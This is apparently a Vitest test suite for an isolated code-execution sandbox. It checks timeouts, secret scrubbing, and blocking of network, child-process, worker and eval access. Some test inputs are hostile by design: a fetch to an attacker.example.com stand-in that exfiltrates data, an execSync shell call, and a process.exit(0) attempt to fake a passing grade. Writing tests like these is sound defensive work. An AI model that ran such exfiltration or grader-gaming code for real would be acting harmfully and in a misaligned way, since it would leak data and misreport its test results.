import { describe, it, expect } from "vitest";
import { executeCodeInSandbox } from "./runner.js";

describe("Isolated Code Runner", () => {
  it("executes valid code and returns passing test results", async () => {
    const result = await executeCodeInSandbox({
      language: "javascript",
      code: "function add(a, b) { return a + b; }",
      testCode: `
        test("1 + 2 equals 3", () => {
          if (add(1, 2) !== 3) throw new Error("Expected 3");
        });
        test("negative numbers", () => {
          if (add(-1, -1) !== -2) throw new Error("Expected -2");
        });
      `,
      timeoutMs: 3000,
      memoryLimitMb: 64,
    });

    expect(result.success).toBe(true);
    expect(result.passed).toBe(true);
    expect(result.exitCode).toBe(0);
    expect(result.tests.length).toBe(2);
    expect(result.tests[0]?.passed).toBe(true);
    expect(result.tests[1]?.passed).toBe(true);
    expect(result.sandboxed).toBe(true);
  });

  it("accurately detects failing test assertions", async () => {
    const result = await executeCodeInSandbox({
      language: "javascript",
      code: "function subtract(a, b) { return a + b; } // Bug: adds instead of subtracts",
      testCode: `
        test("5 - 2 equals 3", () => {
          if (subtract(5, 2) !== 3) throw new Error("Expected 3 but got " + subtract(5, 2));
        });
      `,
      timeoutMs: 3000,
      memoryLimitMb: 64,
    });

    expect(result.success).toBe(true);
    expect(result.passed).toBe(false);
    expect(result.exitCode).toBe(1);
    expect(result.tests[0]?.passed).toBe(false);
    expect(result.tests[0]?.error).toContain("Expected 3");
  });

  it("kills infinite loops cleanly via watchdog timeout", async () => {
    const result = await executeCodeInSandbox({
      language: "javascript",
      code: "function infiniteLoop() { while (true) {} }",
      testCode: `
        test("infinite loop test", () => {
          infiniteLoop();
        });
      `,
      timeoutMs: 800,
      memoryLimitMb: 64,
    });

    expect(result.passed).toBe(false);
    expect(result.exitCode).toBe(124); // timeout exit code
    expect(result.error).toContain("timed out");
  });

  it("scrubs secrets: sandbox process cannot read host environment variables", async () => {
    process.env.SECRET_API_TOKEN_FOR_TEST = "SUPER_SECRET_VALUE";

    const result = await executeCodeInSandbox({
      language: "javascript",
      code: "function getSecret() { return process.env.SECRET_API_TOKEN_FOR_TEST; }",
      testCode: `
        test("secret must not be visible", () => {
          if (getSecret() !== undefined) throw new Error("LEAK: secret was visible in sandbox!");
        });
      `,
      timeoutMs: 2000,
      memoryLimitMb: 64,
    });

    expect(result.passed).toBe(true);
    delete process.env.SECRET_API_TOKEN_FOR_TEST;
  });

  it("prohibits outbound network access via fetch", async () => {
    const result = await executeCodeInSandbox({
      language: "typescript",
      code: `
        export async function exfiltrateData() {
          await fetch("https://attacker.example.com/steal");
        }
      `,
      testCode: `
        test("network calls must throw SecurityException", async () => {
          let caught = false;
          try {
            await exfiltrateData();
          } catch (e: any) {
            caught = true;
            if (!e.message.includes("SecurityException")) {
              throw new Error("Expected SecurityException but got: " + e.message);
            }
          }
          if (!caught) throw new Error("fetch was not intercepted!");
        });
      `,
      timeoutMs: 6000,
      memoryLimitMb: 64,
    });

    expect(result.success).toBe(true);
    expect(result.passed).toBe(true);
    expect(result.tests[0]?.passed).toBe(true);
  }, 12000);

  it("prohibits host child process execution", async () => {
    const result = await executeCodeInSandbox({
      language: "typescript",
      code: `
        import cp from "node:child_process";
        export function spawnAttack() {
          return cp.execSync("whoami").toString();
        }
      `,
      testCode: `
        test("spawning child processes must be denied", () => {
          let caught = false;
          try {
            spawnAttack();
          } catch (e: any) {
            caught = true;
            const msg = e.message || String(e);
            if (!msg.includes("restricted") && !msg.includes("ERR_ACCESS_DENIED") && !msg.includes("SecurityException")) {
              throw new Error("Expected access denied error, got: " + msg);
            }
          }
          if (!caught) throw new Error("execSync was permitted!");
        });
      `,
      timeoutMs: 6000,
      memoryLimitMb: 64,
    });

    expect(result.success).toBe(true);
    expect(result.passed).toBe(true);
    expect(result.tests[0]?.passed).toBe(true);
  }, 12000);

  it("prohibits worker thread creation", async () => {
    const result = await executeCodeInSandbox({
      language: "typescript",
      code: `
        import { Worker } from "node:worker_threads";
        export function spawnWorker() {
          new Worker("console.log('pwn')", { eval: true });
        }
      `,
      testCode: `
        test("worker threads must be denied", () => {
          let caught = false;
          try {
            spawnWorker();
          } catch (e: any) {
            caught = true;
            const msg = e.message || String(e);
            if (!msg.includes("restricted") && !msg.includes("ERR_ACCESS_DENIED") && !msg.includes("SecurityException")) {
              throw new Error("Expected worker restriction error, got: " + msg);
            }
          }
          if (!caught) throw new Error("Worker creation was permitted!");
        });
      `,
      timeoutMs: 6000,
      memoryLimitMb: 64,
    });

    expect(result.success).toBe(true);
    expect(result.passed).toBe(true);
    expect(result.tests[0]?.passed).toBe(true);
  }, 12000);

  it("prohibits dynamic string code evaluation via eval()", async () => {
    const result = await executeCodeInSandbox({
      language: "typescript",
      code: `
        export function runDynamic(str: string) {
          return eval(str);
        }
      `,
      testCode: `
        test("eval must throw EvalError", () => {
          let caught = false;
          try {
            runDynamic("2 + 2");
          } catch (e: any) {
            caught = true;
            if (!e.message.includes("disallowed")) {
              throw new Error("Expected disallowed string code gen error, got: " + e.message);
            }
          }
          if (!caught) throw new Error("eval was permitted!");
        });
      `,
      timeoutMs: 6000,
      memoryLimitMb: 64,
    });

    expect(result.success).toBe(true);
    expect(result.passed).toBe(true);
    expect(result.tests[0]?.passed).toBe(true);
  }, 12000);

  it("rejects candidate code attempting to fake test pass via process.exit()", async () => {
    const result = await executeCodeInSandbox({
      language: "typescript",
      code: `
        // Malicious candidate attempts to exit with 0 before test suite executes
        process.exit(0);
      `,
      testCode: `
        test("legitimate test that should never be skipped", () => {
          // If candidate aborted process, this wouldn't pass
        });
      `,
      timeoutMs: 6000,
      memoryLimitMb: 64,
    });

    // Must NOT pass because tests were intercepted or could not complete cleanly
    expect(result.passed).toBe(false);
  });
});

